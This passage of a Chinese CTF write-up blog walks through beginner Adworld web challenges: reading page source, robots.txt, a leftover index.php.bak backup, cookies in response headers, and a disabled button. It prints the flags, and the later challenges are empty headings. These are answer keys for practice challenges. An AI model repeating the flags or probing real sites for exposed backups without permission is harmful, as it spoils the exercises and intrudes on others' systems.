<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;246200d6931d72f4da7a2b590b08b595&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h3><ul>
<li>掌握查看源代码的方式，右键会被禁，但是<code>F12</code>谁也拦不住</li>
<li>在 <code>Web</code> 方向的题目中，有许多 <code>flag</code> 都会以 <code>注释</code> 等形式隐藏在源代码中</li>
</ul>
<h2 id="T2-robots"><a href="#T2-robots" class="headerlink" title="T2 robots"></a>T2 robots</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p>
<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先，打开在线题目场景，发现什么都没有，空白一片，并且使用 <code>F12</code> 查看源代码，空空如也。只有注释中一句 <code>&lt;!--flag is not here--&gt;</code></p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_robots_1.png" alt=""></p>
            </div>

<p>结合题目 <code>Robots</code> 协议，猜测可能在网站的 <code>/robots.txt</code> 文件中会有东西。打开一看，果不其然。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_robots_2.png" alt=""></p>
            </div>

<p>根据提示，直接打开 <code>f1ag_1s_h3re.php</code> ，得到 <code>flag</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;b5941b7cbedb09d8e51524b7bfa79095&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目总结-1"><a href="#题目总结-1" class="headerlink" title="题目总结"></a>题目总结</h3><ul>
<li><code>Robots</code> 协议通过放置在网站的根目录下的 <code>robots.txt</code> 文件来告诉搜索引擎的漫游器哪些内容是不应被搜索引擎获取的。但是 <code>Robots</code> 防君子（搜索引擎）不防小人（我）</li>
</ul>
<h2 id="T3-backup"><a href="#T3-backup" class="headerlink" title="T3 backup"></a>T3 backup</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开在线题目场景，提示 <strong>你知道index.php的备份文件名吗？</strong></p>
<p><code>PHP</code> 的备份文件名通常的命名方式为 <code>文件名.bak</code> 或者 <code>文件名~</code> 于是乎直接访问 <code>index.php~</code>路径，404；访问 <code>index.php.bak</code> 路径，得到该 <code>.bak</code> 文件。文件内容如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;备份文件&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span> /&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body&#123;</span><br><span class="line">            margin-left:auto;</span><br><span class="line">            margin-right:auto;</span><br><span class="line">            margin-TOP:<span class="number">200</span>PX;</span><br><span class="line">            width:<span class="number">20</span>em;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;你知道index.php的备份文件名吗？&lt;/h3&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这样就获得了 <code>flag</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目总结-2"><a href="#题目总结-2" class="headerlink" title="题目总结"></a>题目总结</h3><ul>
<li><code>PHP</code> 的备份文件名通常的命名方式为 <code>文件名.bak</code> 或者 <code>文件名~</code> </li>
</ul>
<h2 id="T4-cookie"><a href="#T4-cookie" class="headerlink" title="T4 cookie"></a>T4 cookie</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p>
<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>打开在线题目场景，提示 <strong>你知道什么是cookie吗？</strong>，查看源代码，无果。想到题目说的“在cookie里放了些东西”于是准备使用 <code>F12</code> 中的 <code>Network</code> 工具抓包分析 <code>HTTP Response Header</code> 的 <code>Set-cookie</code> 字段。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_cookie_1.png" alt=""></p>
            </div>

<p>在 <code>HTTP Response</code> 中发现了 <code>Set-cookie</code> 字段有.东西。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_cookie_2.png" alt=""></p>
            </div>

<p>按照提示打开<code>cookie.php</code>，得到提示 <code>See the http response</code>。依旧是使用浏览器自带的 <code>Network</code> 工具分析 <code>HTTP Response</code>。发现字段 <code>flag</code> 的value就是我们所要找的 <code>flag</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;902d038f991e55ae541a17aa66bb3e72&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目总结-3"><a href="#题目总结-3" class="headerlink" title="题目总结"></a>题目总结</h3><ul>
<li>善用Google赐予你的抓包工具——<code>F12</code>中的<code>Network</code>标签</li>
<li><code>Cookie</code>在<code>Server</code>与<code>Client</code>之间的传输使用过程：<ol>
<li>首先，<code>Server</code> 通过 <code>HTTP Response Header</code> 中的 <code>Set-Cookie</code> 字段将 <code>cookie</code> 发送给<code>Client</code></li>
<li>在下一次 <code>Client</code> 发起 <code>HTTP Request</code> 时，<code>Client</code> 把 <code>cookie</code> 通过 <code>HTTP Request Header</code> 中的 <code>Cookie</code> 字段发送给server</li>
<li>每次 <code>HTTP Request</code> ，Cookie都会被发送。</li>
</ol>
</li>
</ul>
<h2 id="T5-disabled-button"><a href="#T5-disabled-button" class="headerlink" title="T5 disabled_button"></a>T5 disabled_button</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先，进入在线题目场景，提示一个不能按的按钮，并且按钮确实“按不下去”，怀疑是在源代码中对这个按钮做了限制。在该按钮元素上 <code>右键 -&gt; 检查</code> 来查看定义该按钮的HTML代码。</p>
<div class="fancybox ">
              <p><img src="https://cdn.jsdelivr.net/gh/Zam-0703/Pictures/img/Web_disabled_button_1.png" alt=""></p>
            </div>

<p>于是乎，发现该按钮被 <code>disabled</code> 了。将该处修改为 <code>abled</code> 或者直接删去，再点击该按钮就会显示出 <code>Flag</code></p>
<h4 id="这里插入图片"><a href="#这里插入图片" class="headerlink" title="这里插入图片"></a>这里插入图片</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;1b36491fe9a1ae35a4455929e57f902d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="题目总结-4"><a href="#题目总结-4" class="headerlink" title="题目总结"></a>题目总结</h3><ul>
<li>当在网页中遇到一些限制时，往往修改一下源代码就可以解除限制。</li>
</ul>
<h2 id="T6-weak-auth"><a href="#T6-weak-auth" class="headerlink" title="T6 weak_auth"></a>T6 weak_auth</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p>
<h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入在线题目场景，除了两个输入框和</p>
<h3 id="题目总结-5"><a href="#题目总结-5" class="headerlink" title="题目总结"></a>题目总结</h3><h2 id="T7-simple-php"><a href="#T7-simple-php" class="headerlink" title="T7 simple_php"></a>T7 simple_php</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="题目总结-6"><a href="#题目总结-6" class="headerlink" title="题目总结"></a>题目总结</h3><h2 id="T8-get-post"><a href="#T8-get-post" class="headerlink" title="T8 get_post"></a>T8 get_post</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="题目总结-7"><a href="#题目总结-7" class="headerlink" title="题目总结"></a>题目总结</h3><h2 id="T9-xff-referer"><a href="#T9-xff-referer" class="headerlink" title="T9 xff_referer"></a>T9 xff_referer</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><h3 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="题目总结-8"><a href="#题目总结-8" class="headerlink" title="题目总结"></a>题目总结</h3><h2 id="T10-webshell"><a href="#T10-webshell" class="headerlink" title="T10 webshell"></a>T10 webshell</h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><h3 id="题目分析-9"><a href="#题目分析-9" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="题目总结-9"><a href="#题目总结-9" class="headerlink" title="题目总结"></a>题目总结</h3><h2 id="T11-command-execution"><a href="#T11-command-execution" class="headerlink" title="T11 command_execution"></a>T11 command_execution</h2><h3 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h3><h3 id="题目分析-10"><a href="#题目分析-10" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="题目总结-10"><a href="#题目总结-10" class="headerlink" title="题目总结"></a>题目总结</h3><h2 id="T12-simple-js"><a href="#T12-simple-js" class="headerlink" title="T12 simple_js"></a>T12 simple_js</h2><h3 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h3><h3 id="题目分析-11"><a href="#题目分析-11" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="题目总结-11"><a href="#题目总结-11" class="headerlink" title="题目总结"></a>题目总结</h3>]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Adworld</tag>
      </tags>
  </entry>
</search>
